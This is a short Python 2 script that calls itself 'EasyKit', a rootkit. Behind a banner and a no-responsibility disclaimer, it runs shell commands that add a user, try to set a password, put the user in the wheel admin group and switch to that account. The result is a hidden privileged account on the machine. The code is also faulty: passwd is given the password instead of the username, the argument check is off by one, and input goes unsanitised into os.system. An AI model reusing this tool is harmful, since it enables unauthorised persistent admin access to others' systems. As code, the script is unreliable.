#!/usr/bin/python

#   - - - - - - - - - - - - - - - - - - - - - -   #
#   Welcome to EasyKit v1.5 developed in Python   #
#   I do not take responsibility for your actions #
#   with EasyKit. This code is/was meant for      #
#   educational/researchive purposes only.        #
#   Developer: Chris Poole | @codingplanets       #
#   - - - - - - - - - - - - - - - - - - - - - -   #
#                      Usages:                    #
#          1)  Save as 'EasyKit.py                #
#          2)  chmod EasyKit.py 777               #
#          3)  python EasyKit.py                  #
#   - - - - - - - - - - - - - - - - - - - - - -   #
#                  Execution:                     #
#     python EasyKit.py <username> <password>     #
#   - - - - - - - - - - - - - - - - - - - - - -   #
#                     Example:                    #
#         python EasyKit.py toor pa55word         #
#   - - - - - - - - - - - - - - - - - - - - - -   #


import os, sys


if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" <username> <password>")
	
print '''
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
               |     ______                _  ___ _                 |
               |    |  ____|              | |/ (_) |                |
               |    | |__   __ _ ___ _   _| | / _| |_               |
               |    |  __| / _| / __| | | |  < | | __|              |
               |    | |___| (_| \__ \ |_| | | \| | |_               |
               |    |______\__|_|___/\___ |_|\_\_|\__|              |
               |                      __/ |                         |
               |                     |___/                          |
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
               |    Easykit is a rootkit developed in shell/python  |
               |     I do not take responsibility for any           |
               |        actions committed with EasyKit              |
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
               |                      Developer:                    |
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
               |              Chris Poole | @codingplanets          |
               | - - - - - - - - - - - - - - - - - - - - - - - - -  |
'''
raw_input("[!] Please press enter if you confirm in rooting this box...")


username = sys.argv[1]
password = str(sys.argv[2])

os.system('adduser '+ sys.argv[1] +'')

os.system('passwd '+ sys.argv[2] +'')


os.system('usermod -aG wheel ' + sys.argv[1] + '')


os.system('su - ' + sys.argv[1] + '')
